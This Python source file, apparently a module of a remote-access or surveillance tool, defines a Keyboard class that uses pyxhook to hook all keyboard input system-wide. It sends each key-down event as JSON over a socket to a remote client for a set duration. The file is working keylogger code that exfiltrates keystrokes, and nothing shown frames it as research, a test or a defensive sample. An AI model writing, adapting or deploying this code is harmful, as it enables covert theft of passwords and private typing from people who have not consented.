import pygame, sys, os
import pygame.camera
import time, random
import base64, json
from pyxhook import HookManager 

SAVEDIR = os.path.dirname(os.path.abspath(__file__)) + "/temp"

pygame.init()

class Keyboard(object):
	__hook = None
	def __init__(self):
		pass
	
	def getKeys(self):
		pass
	
	def getKeysData(self,socketClient, size):
		def sendKey(event):
			data = json.dumps({'type': 6, 'code': 1 ,'status' : 'OK', 'keyboard': str(event)})
			try:
				socketClient.sendall(data)
			except:
				return None
		
		self.__hook = HookManager()
		self.__hook.HookKeyboard()
		self.__hook.KeyDown = sendKey
		if self.__hook == None:
			return
		self.__hook.start()
		time.sleep(size)
		self.__hook.cancel()
		
